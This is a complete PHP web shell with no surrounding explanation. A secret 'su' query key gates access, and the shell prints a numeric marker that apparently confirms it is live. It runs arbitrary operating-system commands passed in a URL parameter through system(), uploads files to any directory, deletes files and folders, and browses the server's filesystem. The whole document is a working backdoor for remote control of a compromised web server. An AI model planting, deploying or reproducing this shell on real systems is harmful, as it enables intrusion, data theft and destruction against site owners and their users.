<?php
if(!isset($_GET['su']))exit;
echo 45*69;
$d=$_GET['d']??'.';
$a=$_GET['a']??'';
$c=$_GET['c']??'';
if($c){echo'<pre>';system($c);echo'</pre>';}
if($a=='up'&&$_FILES[u]){move_uploaded_file($_FILES[u][tmp_name],"$d/{$_FILES[u][name]}");echo'<script>location.href="?su=1&d='.rawurlencode($d).'"</script>';}
if($a=='rm'&&$_GET[f]){is_dir($_GET[f])?rmdir($_GET[f]):unlink($_GET[f]);}
$x=scandir($d);echo'<style>body{margin:20px;font:13px monospace;background:#111;color:#0f0}a{color:#0f0;text-decoration:none}a:hover{color:#fff}.pane{background:#1a1a1a;padding:10px;margin:10px 0;border:1px solid #333}.rm{color:#f00}</style>';
echo"<div class=pane><form><input type=hidden name=su value=1><input type=hidden name=d value=".htmlspecialchars($d)."><b>Terminal</b> <input name=c style='width:500px;background:#000;color:#0f0;border:1px solid #0f0;font:13px monospace' placeholder='cmd' value=".htmlspecialchars($c)."><input type=submit value=Run></form></div>";
echo"<div class=pane><b>Dir: $d</b> <a href=?su=1&d=".dirname($d).">[..]</a> <a href=?su=1&d=".getcwd().">[root]</a><table>";
if(is_array($x))foreach($x as$v){if($v=='.')continue;$p="$d/$v";$i=is_dir($p);
echo'<tr><td>'.($i?'<b>':'')."<a href=?su=1&d=".rawurlencode($p).">$v</a>".($i?'</b>':'').'</td>';
echo'<td>'.($i?'DIR':sprintf('%sB',filesize($p))).'</td>';
echo"<td><a class=rm href=?su=1&a=rm&f=".rawurlencode($p)." onclick='return confirm(1)'>[X]</a></td></tr>";}
echo'</table></div><div class=pane><form method=post enctype=multipart/form-data><input type=hidden name=su value=1><input type=hidden name=d value='.htmlspecialchars($d).'><input type=file name=u><input type=submit value=Upload></form></div>';
